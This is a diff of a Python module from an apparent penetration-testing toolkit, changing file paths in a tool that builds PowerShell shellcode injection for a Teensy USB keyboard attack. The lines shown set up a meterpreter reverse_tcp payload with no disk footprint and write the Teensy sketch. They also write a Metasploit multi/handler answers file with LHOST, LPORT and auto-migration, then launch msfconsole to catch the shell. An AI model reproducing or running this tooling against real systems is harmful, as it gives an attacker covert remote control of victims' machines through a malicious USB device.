@@ -1,6 +1,7 @@
 #!/usr/bin/python
 import pexpect
 from src.core.setcore import yesno_prompt
+from src.core import *
 
 print """
 The powershell - shellcode injection leverages powershell to send a meterpreter session straight into memory without ever touching disk.
@@ -13,15 +14,15 @@ payload = raw_input("Select payload you want to delivery via the powershell - sh
 if payload == "": payload = "2"
 
 if payload == "1":
-    path = "src/program_junk/x86.powershell"
+    path = setdir + "/x86.powershell"
     payload = "windows/meterpreter/reverse_tcp"
 if payload == "2":
-    path = "src/program_junk/x64.powershell"
+    path = setdir + "/x64.powershell"
     payload = "windows/x64/meterpreter/reverse_tcp"
 
 
 # create base metasploit payload to pass to powershell.prep
-filewrite = file("src/program_junk/metasploit.payload", "w")
+filewrite = file(setdir + "/metasploit.payload", "w")
 filewrite.write(payload)
 filewrite.close()
 
@@ -142,8 +143,8 @@ Keyboard.set_key1(0);
 Keyboard.send_now();
 }
 """)
-print "[*] Payload has been extracted. Copying file to reports/teensy.pde"
-filewrite = file("reports/teensy.pde", "w")
+print "[*] Payload has been extracted. Copying file to %s/reports/teensy.pde" % (setdir)
+filewrite = file(setdir + "/reports/teensy.pde", "w")
 filewrite.write(teensy)
 filewrite.close()
 choice = yesno_prompt("0","Do you want to start a listener [yes/no]: ")
@@ -163,11 +164,11 @@ if choice == "YES":
     else:
         port = raw_input("Enter the port to connect back on: ")
 
-    filewrite = file("src/program_junk/metasploit.answers", "w")
+    filewrite = file(setdir + "/metasploit.answers", "w")
     filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset AutoRunScript post/windows/manage/smart_migrate\nexploit -j" % (payload,ipaddr,port))
     filewrite.close()
     print "[*] Launching Metasploit...."
     try:
-        child = pexpect.spawn("msfconsole -r src/program_junk/metasploit.answers")
+        child = pexpect.spawn("msfconsole -r %s/metasploit.answers" % (setdir))
         child.interact()
     except: pass
